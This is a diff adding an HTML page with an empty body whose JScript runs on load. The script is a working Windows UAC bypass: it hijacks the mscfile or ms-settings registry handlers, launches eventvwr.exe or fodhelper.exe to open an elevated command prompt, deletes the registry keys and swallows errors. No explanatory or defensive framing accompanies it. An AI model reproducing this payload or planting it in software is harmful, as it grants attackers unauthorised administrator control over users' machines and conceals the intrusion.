@@ -1,0 +1,50 @@
+<html>
+<head>
+<script language="JScript">
+    function RunCommand(command) {
+        var shell = new ActiveXObject("WScript.Shell");
+        shell.Run(command, 0, true);
+    }
+
+    function BypassUAC() {
+        var shell = new ActiveXObject("WScript.Shell");
+        var fso = new ActiveXObject("Scripting.FileSystemObject");
+        var wmiService = GetObject("winmgmts:\\\\.\\root\\cimv2");
+
+        var osMajorVersion;
+        var colItems = wmiService.ExecQuery("Select * from Win32_OperatingSystem");
+        var enumerator = new Enumerator(colItems);
+
+        for (; !enumerator.atEnd(); enumerator.moveNext()) {
+            var objItem = enumerator.item();
+            var arrVersion = objItem.Version.split(".");
+            if (arrVersion.length > 0) {
+                osMajorVersion = parseInt(arrVersion[0], 10);
+            } else {
+                WScript.Quit(1);
+            }
+            break;
+        }
+
+        if (osMajorVersion < 10) {
+            RunCommand('reg add "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" /d "cmd.exe /c start cmd.exe" /f');
+            RunCommand("eventvwr.exe");
+            RunCommand('reg delete "HKCU\\Software\\Classes\\mscfile" /f');
+        } else {
+            try {
+                shell.RegWrite("HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\\", "cmd.exe /c start cmd.exe", "REG_SZ");
+                shell.RegWrite("HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\\DelegateExecute", "", "REG_SZ");
+                RunCommand("fodhelper.exe");
+                shell.RegDelete("HKCU\\Software\\Classes\\ms-settings\\");
+            } catch (e) {
+                // Handle errors silently
+            }
+        }
+    }
+
+    BypassUAC();
+</script>
+</head>
+<body>
+</body>
+</html>
